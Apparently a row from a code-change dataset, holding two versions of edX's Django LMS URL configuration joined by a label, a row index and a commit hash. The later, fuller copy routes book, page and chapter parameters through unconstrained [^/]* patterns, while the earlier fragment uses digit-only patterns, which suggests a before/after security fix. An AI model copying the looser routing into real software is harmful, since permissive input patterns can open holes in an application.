    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
41,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
